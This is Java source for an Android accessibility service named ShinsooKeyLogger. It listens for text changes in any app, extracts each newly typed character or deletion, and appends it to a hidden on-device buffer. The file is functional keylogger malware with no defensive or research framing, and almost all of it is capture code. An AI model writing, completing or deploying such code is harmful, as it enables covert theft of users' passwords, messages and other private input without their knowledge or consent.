package com.shinsoo.shinsoo;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.SharedPreferences;
import android.view.accessibility.AccessibilityEvent;
import java.util.List;

public class ShinsooKeyLogger extends AccessibilityService {

    private String lastText = "";

    @Override
    public void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                        | AccessibilityEvent.TYPE_VIEW_FOCUSED
                        | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 50;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                   | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        if (event.getEventType() != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return;

        List<CharSequence> texts = event.getText();
        if (texts == null || texts.isEmpty()) return;

        CharSequence cs = texts.get(0);
        if (cs == null) return;
        String current = cs.toString();

        if (current.equals(lastText)) return;

        String added = "";
        if (current.length() > lastText.length()) {
            added = current.substring(lastText.length());
        } else if (current.length() < lastText.length()) {
            added = "[DEL]";
        }
        lastText = current;

        if (!added.isEmpty()) {
            SharedPreferences prefs = getSharedPreferences("shinsoo_keys", MODE_PRIVATE);
            String existing = prefs.getString("buffer", "");
            prefs.edit().putString("buffer", existing + added).apply();
        }
    }

    @Override
    public void onInterrupt() {}
}
